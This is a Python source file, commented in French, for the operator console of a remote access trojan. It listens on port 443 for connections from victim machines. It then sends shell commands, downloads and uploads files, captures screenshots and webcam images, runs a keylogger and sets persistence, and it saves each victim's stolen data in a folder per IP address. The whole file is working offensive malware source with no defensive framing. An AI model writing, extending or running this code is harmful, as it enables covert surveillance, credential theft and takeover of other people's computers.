#!/usr/bin/python3

import platform
import socket
import json
import os
import time

# Create a global variable for the socket and client connection
s = None
target = None
ip = None
reper = os.getcwd()

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
base_dir = os.path.join(desktop_path, "Clients")  # Dossier racine sur le bureau


def create_client_folder(client_ip):
    """
    Crée un dossier pour le client basé sur son adresse IP.
    """
    client_folder = os.path.join(base_dir, client_ip)
    if not os.path.exists(client_folder):
        os.makedirs(os.path.join(client_folder, "screenshots"), exist_ok=True)
        os.makedirs(os.path.join(client_folder, "downloads"), exist_ok=True)
        os.makedirs(os.path.join(client_folder, "keylogger"), exist_ok=True)
    return client_folder



def clear_screen():
    """
    Nettoie l'écran en fonction du système d'exploitation.
    """
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    
    
def show_help():
    """
    Affiche une liste des commandes disponibles.
    """
    help_text = """
    Liste des commandes disponibles :
    ---------------------------------
    cd <path>         : Changer le répertoire sur la machine cible.
    cd                : Afficher le répertoire courant sur la machine cible.
    download <file>   : Télécharger un fichier depuis la machine cible.
    upload <file>     : Envoyer un fichier vers la machine cible.
    screenshot        : Capturer une capture d'écran de la machine cible.
    camera            : Capturer une image depuis la webcam de la machine cible.
    keylogger start   : Démarrer l'enregistrement des touches.
    keylogger stop    : Arrêter et télécharger les données du keylogger.
    persistance       : Configurer la persistance sur la machine cible.
    clear/cls         : Nettoyer l'écran.
    help              : Afficher cette aide.
    exit/quit         : Quitter la session.
    """
    print(help_text)    
#la fonction pour etablire la connexion avec la machine vicitme
def connection():
    global s, target, ip

    # Create a new socket instance
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Configure the socket
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind the socket to an IP address and port
    s.bind(("192.168.1.34", 443))

    # Start listening for incoming connections
    s.listen(5)
    print("Listening for incoming connections...")

    # Accept an incoming connection
    target, ip = s.accept()
    print(f"Connected to {ip}")
    create_client_folder(ip[0]) #creer un dossier pour le client

#la fonction qui vas fair l'envoi des commandes vers la machine de la vicitme
def sending(command):
    # Convert the command to JSON format and send it
    json_data = json.dumps(command)
    target.send(json_data.encode())

#la fonction qui vas recever les resultats des commande executer dans la machine de la vicitme
def receive():
    json_data = ""
    while True:
        try:
            # Receive data from the target in chunks
            chunk = target.recv(4096).decode('utf-8', errors='replace')
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue


#la fonction global qui possede les appelles aux fonction declarer dans le haut + possede les fonctionaliter de trojan ...
def shell():
    global reper
    try:
        client_folder = create_client_folder(ip[0])  # Dossier du client connecté
        while True:
            #un simple affichage 
            command = input(f"* Shell#{ip} ==> : ")
            
            #la commande pour quite le shell    
            if command.lower() in ["exit", "quit"]:
                sending(command)
                print("Command received to end connection.")
                break
            
            #la commande pour savoire votre emplacemment dans la machine de la victime    
            elif command.startswith("cd "):  # Gestion des commandes cd
                sending(command)
                response = receive()
                print(response)
                continue
            
            elif command.lower() in ["clear", "cls"]:
                clear_screen()
                continue

            elif command.lower() == "help":
                show_help()
                continue
            
             #la commande pour puise fair changer le repertoire dans la machine de la vicitime   
            elif command.strip() == "cd":  # Vérifier le répertoire courant
                sending(command)
                response = receive()  # Recevoir le répertoire courant
                reper=response
                print(f"Current directory: {response}")
                continue
            
            #la commande pour puise fair une capture d'ecran sur la machine de ma vicitme
            elif command.strip() == "screenshot":
                sending(command)
                response = receive()
                if response.get("status") == "success":
                    try:
                        screenshot_data = response.get("data")
                        if not screenshot_data:
                            print("No screenshot data received.")
                            continue
                        # Chemin de sauvegarde
                        screenshot_path = os.path.join(client_folder ,"screenshots", f"{ip}_ScreenShot.png")
                        with open(screenshot_path, "wb") as f:
                            f.write(bytes.fromhex(screenshot_data))
                        print(f"Screenshot saved successfully at {screenshot_path}.")
                    except Exception as e:
                        print(f"Error saving screenshot: {str(e)}")
                else:
                    print(f"Error taking screenshot: {response.get('message')}")
                continue

            
            #la commande pour puisse telecharger des fichier ou des dossier depuis la machine de la vicitme
            elif command.startswith("download "):
                sending(command)
                response = receive()

                # Chemin de stockage

                if response.get("status") == "success":
                    # Extraire le nom du fichier demandé
                    filename = os.path.basename(command[9:].strip())
                    filepath = os.path.join(client_folder,"downloads", filename)

                # Sauvegarder le fichier directement dans le répertoire Downloads
                    with open(filepath, "wb") as f:
                        f.write(bytes.fromhex(response["data"]))
        
                    print(f"File downloaded successfully: {filepath}")
                else:
                    print(f"Error downloading file: {response.get('message')}")
                continue
            
           #la commande pour puise uploader des fichier dans la machine de vicitime 
            elif command.startswith("upload "):
                try:
                # Récupérer le chemin spécifié par l'utilisateur
                    filepath = command.split(" ", 1)[1]
        
                # Ajouter le répertoire courant s'il s'agit d'un chemin relatif
                    if not os.path.isabs(filepath):
                        filepath = os.path.join(reper, filepath)
                    else: 
                        filepath = filename
                # Debug : Afficher le chemin réel utilisé
                    print(f"Attempting to upload file from: {filepath}")
        
                # Vérifier si le fichier existe
                    if not os.path.exists(filepath):
                        print(f"File '{filepath}' does not exist.")
                        continue
        
        # Lire le fichier
                    with open(filepath, "rb") as f:
                        filedata = f.read().hex()
        
                    # Envoyer au client
                    sending(f"upload {filepath} {filedata}")
                    response = receive()
                    print(response)
                except Exception as e:
                    print(f"Error uploading file: {str(e)}")
                continue
            
            if command.strip() == "camera":
                sending(command)  # Envoyer la commande au client
                response = receive()  # Recevoir la réponse du client
                if isinstance(response, dict) and response.get("status") == "success":
                    # Récupérer les données de l'image
                    image_data = bytes.fromhex(response.get("data"))
        
                    # Chemin de sauvegarde dans le dossier du client
                    image_folder = os.path.join(client_folder, "screenshots")
                    os.makedirs(image_folder, exist_ok=True)  # S'assurer que le dossier existe

                    # Nommer le fichier en fonction de l'heure pour éviter les conflits
                    image_path = os.path.join(image_folder, f"camera_image_{time.strftime('%Y%m%d_%H%M%S')}.png")
        
                    # Enregistrer l'image capturée
                    with open(image_path, "wb") as f:
                        f.write(image_data)

                    print(f"Image successfully saved at: {image_path}")
                else:
                    print(f"Failed to capture image: {response}")
                continue

            
            elif command.strip() == "keylogger start":
                # Envoi de la commande pour démarrer l'enregistrement des touches
                sending(command)
                response = receive()  # Réponse du client
                print(response)  # Afficher le message de statut
                continue
            
            elif command.strip() == "keylogger stop":
                sending(command)
                response = receive()
                if response.get("status") == "success":
                    keystrokes_path = os.path.join(client_folder, "keylogger", "keystrokes.txt")
                    with open(keystrokes_path, "wb") as f:
                        f.write(bytes.fromhex(response["data"]))
                    print(f"Keystrokes file saved at: {keystrokes_path}")
                else:
                    print(f"Failed to receive keystrokes file: {response.get('message')}")
            
            # Code côté serveur pour envoyer la commande persistance
            elif command.strip() == "persistance":
                sending(command)  # Envoyer la commande au client pour qu'il configure la persistance
                response = receive()  # Attendre la réponse du client (statut)
                print(response)  # Afficher si la persistance a été configurée avec succès
                continue




            # Envoyer d'autres commandes au client
            sending(command)
            response = receive()
            print(response)

    except KeyboardInterrupt:
        print("Interruption by user!")



# le main
if __name__ == "__main__":
    try:
        connection()
        shell()
    finally:
        # Ensure the socket and connection are properly closed
        if target:
            target.close()
        if s:
            s.close()